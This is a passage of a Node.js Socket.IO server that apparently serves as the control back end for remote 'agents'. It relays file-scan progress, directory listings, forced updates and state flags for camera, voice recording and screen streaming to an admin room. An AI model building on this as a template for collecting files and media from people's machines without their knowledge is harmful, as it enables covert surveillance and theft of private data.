        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const stage = String(data.stage || '');
        const isRunning = ['started', 'queued', 'scanning', 'retrying', 'stopping', 'already_running', 'resetting'].includes(stage);
        const scanPath = typeof data.scanPath === 'string' ? data.scanPath : '';
        const allowedExtensions = Array.isArray(data.allowedExtensions) ? data.allowedExtensions : (agents[socket.id]?.imageSyncAllowedExtensions || null);

        agents[socket.id] = {
            ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
            imageSyncRunning: isRunning,
            imageSyncNextIndex: Number(data.nextIndex ?? data.index ?? 0) || 0,
            imageSyncTotalFiles: Number(data.totalFiles ?? data.total ?? 0) || 0,
            imageSyncScanPath: scanPath,
            imageSyncAllowedExtensions: allowedExtensions,
            lastImageSyncAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_image_sync_status', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('image_sync_snapshot', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const scanPath = typeof data.scanPath === 'string' ? data.scanPath : '';
        const allowedExtensions = Array.isArray(data.allowedExtensions) ? data.allowedExtensions : (agents[socket.id]?.imageSyncAllowedExtensions || null);
        agents[socket.id] = {
            ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
            imageSyncRunning: Boolean(data.running),
            imageSyncNextIndex: Number(data.nextIndex ?? 0) || 0,
            imageSyncTotalFiles: Number(data.totalFiles ?? 0) || 0,
            imageSyncScanPath: scanPath,
            imageSyncAllowedExtensions: allowedExtensions,
            lastImageSyncAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).emit('ui_image_sync_snapshot', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('directory_listing', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('ui_directory_listing', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('agent_update_status', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('ui_agent_update_status', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('admin_force_update_all', () => {
        if (!isAdmin) {
            return;
        }

        emitControl('force_update_check');
        io.to(ADMIN_ROOM).emit('ui_update_broadcast_sent', {
            scope: 'all',
            sentAt: Date.now(),
            by: socket.data.user?.email || socket.data.user?.uid || 'admin'
        });
    });

    socket.on('disconnect', () => {
        if (isAdmin) {
            console.log(`[admin] disconnected: ${socket.id}`);
            return;
        }
        if (isViewer) {
            console.log(`[viewer] disconnected: ${socket.id}`);
            return;
        }

        console.log(`[agent-socket] disconnected: ${socket.id}`);
        delete agents[socket.id];
        emitAgentList();
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_agent_state', {
            agentId: socket.id,
            online: false,
            recording: false,
            cameraOn: false,
            voiceRecording: false,
            screenStreaming: false,
            source: 'disconnect'
        });
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on 0.0.0.0:${PORT}`);
    console.log(`Allowed CLIENT_ORIGIN: ${CLIENT_ORIGIN}`);
});
